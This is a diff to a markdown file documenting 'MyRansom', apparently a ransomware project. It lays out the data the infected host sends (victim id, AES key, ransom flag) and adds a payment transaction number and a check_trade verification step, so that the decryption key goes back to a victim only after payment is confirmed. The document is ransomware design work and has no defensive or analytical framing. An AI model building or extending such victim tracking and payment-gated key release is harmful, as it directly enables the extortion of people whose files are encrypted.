@@ -1,6 +1,6 @@
 # Args of MyRansom
 
-## infected host
+## Infected Host
 
 ### init
 
@@ -26,7 +26,8 @@ post_data = {
 post_data = {
     'id': self.id,
     'aes_key': self.aes_key,
-    'ransom': True
+    'ransom': True,
+    'out_trade_no': out_trade_no
 }
 ```
 
@@ -54,14 +55,26 @@ viclist = [
 ]
 ```
 
+### verify
+
+```python
+if not check_trade(out_trade_no):
+    response = {
+        'id': victim_id,
+        'status': 'failure'
+    }
+```
+
 ### paid
 
 ```python
-aes_key = dec_key()
-post_data = {
-    'id': victim_id,
-    'aes_key': aes_key
-}
+if check_trade(out_trade_no):
+    aes_key = dec_key()
+    response = {
+        'id': victim_id,
+        'aes_key': aes_key,
+        'status': 'success'
+    }
 ```
 
 ## Front-end
